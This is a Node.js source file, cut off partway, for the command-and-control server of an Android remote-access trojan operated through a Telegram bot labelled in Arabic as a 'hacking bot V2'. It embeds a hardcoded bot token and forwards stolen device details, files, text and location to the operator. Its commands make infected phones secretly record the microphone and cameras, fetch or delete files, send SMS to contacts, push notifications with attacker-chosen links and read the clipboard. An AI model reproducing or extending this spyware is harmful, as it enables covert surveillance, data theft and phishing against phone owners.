const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6475211683:AAGc5YY1iwWwhgCnK64rgoN0z-diXxv-9NE'
const id = '5401818788'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">\u062A\u0645 \u062A\u062D\u0645\u064A\u0644 \u0627\u0644\u062E\u0627\u062F\u0645 \u0628\u0646\u062C\u0627\u062D</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `\u00B0\u2022 \u0631\u0633\u0627\u0644\u0629 \u0645\u0646 <b>${req.headers.model}</b> \u062C\u0647\u0627\u0632 `,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `\u00B0\u2022 \u0631\u0633\u0627\u0644\u0629 \u0645\u0646 <b>${req.headers.model}</b> \u062C\u0647\u0627\u0632 \n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `\u00B0\u2022 \u0627\u0644\u0645\u0648\u0642\u0639 \u0645\u0646 <b>${req.headers.model}</b> \u062C\u0647\u0627\u0632 `, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `\u00B0\u2022 \u062C\u0647\u0627\u0632 \u062C\u062F\u064A\u062F \u0645\u062A\u0635\u0644\u2611\uFE0F\n\n` +
        `\u2022 \u0637\u0631\u0627\u0632 \u0627\u0644\u062C\u0647\u0627\u0632\uD83D\uDCF1 : <b>${model}</b>\n` +
        `\u2022 \u0628\u0637\u0627\u0631\u064A\u0629 \uD83D\uDD0B : <b>${battery}</b>\n` +
        `\u2022 \u0646\u0633\u062E\u0629 \u0623\u0646\u062F\u0631\u0648\u064A\u062F : <b>${version}</b>\n` +
        `\u2022  \u0633\u0637\u0648\u0639 \u0627\u0644\u0634\u0627\u0634\u0629 : <b>${brightness}</b>\n` +
        `\u2022 \u0646\u0648\u0639 \u0627\u0644\u0634\u0631\u064A\u062D\u0629 SIM : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `\u00B0\u2022 \u0627\u0644\u062C\u0647\u0627\u0632 \u063A\u064A\u0631 \u0645\u062A\u0635\u0644 \u274E\n\n` +
            `\u2022 \u0637\u0631\u0627\u0632 \u0627\u0644\u062C\u0647\u0627\u0632\uD83D\uDCF1 : <b>${model}</b>\n` +
            `\u2022 \u0628\u0637\u0627\u0631\u064A\u0629 \uD83D\uDD0B : <b>${battery}</b>\n` +
            `\u2022 \u0646\u0633\u062E\u0629 \u0623\u0646\u062F\u0631\u0648\u064A\u062F : <b>${version}</b>\n` +
            `\u2022  \u0633\u0637\u0648\u0639 \u0627\u0644\u0634\u0627\u0634\u0629 : <b>${brightness}</b>\n` +
            `\u2022 \u0646\u0648\u0639 \u0627\u0644\u0634\u0631\u064A\u062D\u0629 SIM : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u064A\u0631\u062C\u0649 \u0627\u0644\u0631\u062F \u0639\u0644\u0649 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0642\u0635\u064A\u0631\u0629 \u0625\u0644\u064A\u0647')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645\n\n' +
                '\u2022 \u0299\u1D07 \u1D04\u1D00\u0280\u1D07\uA730\u1D1C\u029F \u1D1B\u029C\u1D00\u1D1B \u1D1B\u029C\u1D07 \u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07 \u1D21\u026A\u029F\u029F \u0274\u1D0F\u1D1B \u0299\u1D07 \uA731\u1D07\u0274\u1D1B \u026A\uA730 \u1D1B\u029C\u1D07 \u0274\u1D1C\u1D0D\u0299\u1D07\u0280 \u1D0F\uA730 \u1D04\u029C\u1D00\u0280\u1D00\u1D04\u1D1B\u1D07\u0280\uA731 \u026A\u0274 \u028F\u1D0F\u1D1C\u0280 \u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07 \u026A\uA731 \u1D0D\u1D0F\u0280\u1D07 \u1D1B\u029C\u1D00\u0274 \u1D00\u029F\u029F\u1D0F\u1D21\u1D07\u1D05',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u062C\u0645\u064A\u0639 \u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0646\u0632\u064A\u0644\u0647')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062D\u0630\u0641\u0647')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0645\u064A\u0643\u0631\u0648\u0641\u0648\u0646 \u0641\u064A\u0647\u0627')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0631\u0626\u064A\u0633\u064A\u0629 \u0641\u064A\u0647\u0627')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0633\u064A\u0644\u0641\u064A \u0641\u064A\u0647\u0627')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0638\u0647\u0648\u0631\u0647\u0627 \u0639\u0644\u0649 \u0627\u0644\u062C\u0647\u0627\u0632 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0638\u0647\u0648\u0631\u0647\u0627 \u0643\u0625\u0634\u0639\u0627\u0631')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0641\u062A\u062D\u0647 \u0628\u0648\u0627\u0633\u0637\u0629 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\n\n' +
                '\u2022 \u1D21\u029C\u1D07\u0274 \u1D1B\u029C\u1D07 \u1D20\u026A\u1D04\u1D1B\u026A\u1D0D \u1D04\u029F\u026A\u1D04\u1D0B\uA731 \u1D0F\u0274 \u1D1B\u029C\u1D07 \u0274\u1D0F\u1D1B\u026A\uA730\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274, \u1D1B\u029C\u1D07 \u029F\u026A\u0274\u1D0B \u028F\u1D0F\u1D1C \u1D00\u0280\u1D07 \u1D07\u0274\u1D1B\u1D07\u0280\u026A\u0274\u0262 \u1D21\u026A\u029F\u029F \u0299\u1D07 \u1D0F\u1D18\u1D07\u0274\u1D07\u1D05',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0641\u062A\u062D\u0647 \u0628\u0648\u0627\u0633\u0637\u0629 \u0627\u0644\u0625\u0634\u0639\u0627\u0631')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0631\u0627\u0628\u0637 \u0627\u0644\u0635\u0648\u062A \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0634\u063A\u064A\u0644\u0647')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
                '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
             appBot.sendMessage(id,
                '\u00B0\u2022 \u0645\u0631\u062D\u0628\u0627 \u0628\u0643 \u0641\u064A \u0628\u0648\u062A \u0627\u062E\u062A\u0631\u0627\u0642 V2\n\n' +
                '\u2022 \u0631\u062C\u0627\u0621 \u0639\u062F\u0645 \u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0628\u0648\u062A \u0641\u064A\u0645\u0627 \u064A\u063A\u0636\u0628  \u0627\u0644\u0644\u0647.\u0647\u0630\u0627 \u0627\u0644\u0628\u0648\u062A \u063A\u0631\u0636 \u0627\u0644\u062A\u0648\u0639\u064A\u0629 \u0648\u062D\u0645\u0627\u064A\u0629 \u0646\u0641\u0633\u0643 \u0645\u0646 \u0627\u0644\u0627\u062E\u062A\u0631\u0627\u0642\n\n' +
                '\u2022 \u062A\u0631\u062C\u0645\u0647 \u0627\u0644\u0628\u0648\u062A \u0628\u0642\u064A\u0627\u062F\u0629\u0020\u0040\u006b\u0069\u006e\u0067\u005f\u0031\u005f\u0034  \u00BB\u0637\u0648\u0641\u0627\u0646 \u0627\u0644\u0623\u0642\u0635\u0649\u21E3\u207D\uD83C\uDDF5\uD83C\uDDF8\u208E \n\n' +
                '\u2022 \u0642\u0646\u0627\u062A\u064A \u062A\u0644\u064A\u062C\u0631\u0627\u0645\u0020\u0074\u002e\u006d\u0065\u002f\u0041\u0062\u0075\u005f\u0059\u0061\u006d\u0061\u006e\u0069\n\n' +
                '\u2022 \u0627\u0636\u063A\u0637 \u0647\u0646\u0627\u0020\u0020\u002f\u0073\u0074\u0061\u0072\u0074',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '\u00B0\u2022 \u0644\u0627 \u062A\u062A\u0648\u0641\u0631 \u0623\u062C\u0647\u0632\u0629 \u062A\u0648\u0635\u064A\u0644 \u274E \n\n' +
                    '\u2022 \u1D0D\u1D00\u1D0B\u1D07 \uA731\u1D1C\u0280\u1D07 \u1D1B\u029C\u1D07 \u1D00\u1D18\u1D18\u029F\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274 \u026A\uA731 \u026A\u0274\uA731\u1D1B\u1D00\u029F\u029F\u1D07\u1D05 \u1D0F\u0274 \u1D1B\u029C\u1D07 \u1D1B\u1D00\u0280\u0262\u1D07\u1D1B \u1D05\u1D07\u1D20\u026A\u1D04\u1D07'
                )
            } else {
                let text = '\u00B0\u2022 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `\u2022 \u0637\u0631\u0627\u0632 \u0627\u0644\u062C\u0647\u0627\u0632\uD83D\uDCF1 : <b>${value.model}</b>\n` +
                        `\u2022 \u0628\u0637\u0627\u0631\u064A\u0629 \uD83D\uDD0B : <b>${value.battery}</b>\n` +
                        `\u2022 \u0646\u0633\u062E\u0629 \u0623\u0646\u062F\u0631\u0648\u064A\u062F : <b>${value.version}</b>\n` +
                        `\u2022  \u0633\u0637\u0648\u0639 \u0627\u0644\u0634\u0627\u0634\u0629 : <b>${value.brightness}</b>\n` +
                        `\u2022 \u0646\u0648\u0639 \u0627\u0644\u0634\u0631\u064A\u062D\u0629 SIM : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '\u00B0\u2022 \u0644\u0627 \u062A\u062A\u0648\u0641\u0631 \u0623\u062C\u0647\u0632\u0629 \u062A\u0648\u0635\u064A\u0644 \u274E \n\n' +
                    '\u2022 \u1D0D\u1D00\u1D0B\u1D07 \uA731\u1D1C\u0280\u1D07 \u1D1B\u029C\u1D07 \u1D00\u1D18\u1D18\u029F\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274 \u026A\uA731 \u026A\u0274\uA731\u1D1B\u1D00\u029F\u029F\u1D07\u1D05 \u1D0F\u0274 \u1D1B\u029C\u1D07 \u1D1B\u1D00\u0280\u0262\u1D07\u1D1B \u1D05\u1D07\u1D20\u026A\u1D04\u1D07'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '\u00B0\u2022 \u062D\u062F\u062F \u0627\u0644\u062C\u0647\u0627\u0632 \u0644\u062A\u0646\u0641\u064A\u0630 \u0627\u0644\u062B\u0646\u0627\u0621 ', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '\u00B0\u2022 \u062A\u0645 \u0631\u0641\u0636 \u0627\u0644\u0625\u0630\u0646 ')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`\u00B0\u2022 \u062D\u062F\u062F \u0627\u0644\u062B\u0646\u0627\u0621 \u0644\u0644\u062C\u0647\u0627\u0632 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '\uD83D\uDCF1\u062A\u0637\u0628\u064A\u0642\u0627\u062A ', callback_data: `apps:${uuid}`},
                        {text: '\u2139\uFE0F\u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632 ', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '\uD83D\uDDC2\uFE0F\u0627\u0644\u062D\u0635\u0648\u0644 \u0639\u0644\u0649 \u0645\u0644\u0641 ', callback_data: `file:${uuid}`},
                        {text: '\uD83D\uDCC2\u062D\u0630\u0641 \u0627\u0644\u0645\u0644\u0641 ', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '\uD83D\uDCCB\u062D\u0627\u0641\u0638\u0629 ', callback_data: `clipboard:${uuid}`},
